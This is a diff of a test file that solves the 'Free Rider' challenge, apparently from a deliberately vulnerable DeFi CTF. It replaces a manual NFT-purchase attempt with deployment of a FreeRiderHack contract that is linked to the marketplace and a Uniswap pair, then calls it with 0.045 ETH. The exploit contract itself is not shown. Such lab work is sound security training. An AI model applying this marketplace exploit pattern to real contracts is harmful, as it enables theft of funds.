@@ -108,25 +108,9 @@ describe('[Challenge] Free Rider', function () {
         /** CODE YOUR SOLUTION HERE */
         [, , , thirdPerson] = await ethers.getSigners();
         const FreeRiderHackFactory = await ethers.getContractFactory('FreeRiderHack', player);
-        const freeRiderHack = await FreeRiderHackFactory.deploy(player.address, nft.address, devsContract.address);
-        // Get player token balance
-        await nft.connect(player).setApprovalForAll(freeRiderHack.address, true);
-        // Take eth from a third person
-        await thirdPerson.sendTransaction({
-            to: player.address,
-            value: NFT_PRICE
-        });
-        // Call buyMany and provide the ids of the NFTs to buy
-        await marketplace.connect(player).buyMany([0, 1, 2, 3, 4, 5], {
-            value: NFT_PRICE
-        });
-        // Return the NFTs to the devs contract
-        await freeRiderHack.connect(player).executeQueueAction();
-
-        await player.sendTransaction({
-            to: thirdPerson.address,
-            value: NFT_PRICE
-        });
+        const freeRiderHack = await FreeRiderHackFactory.deploy(player.address, weth.address, nft.address, devsContract.address,
+            marketplace.address, uniswapFactory.address, uniswapPair.address);
+        await freeRiderHack.connect(player).execute({ value: ethers.utils.parseEther('0.045') });
     });
 
     after(async function () {
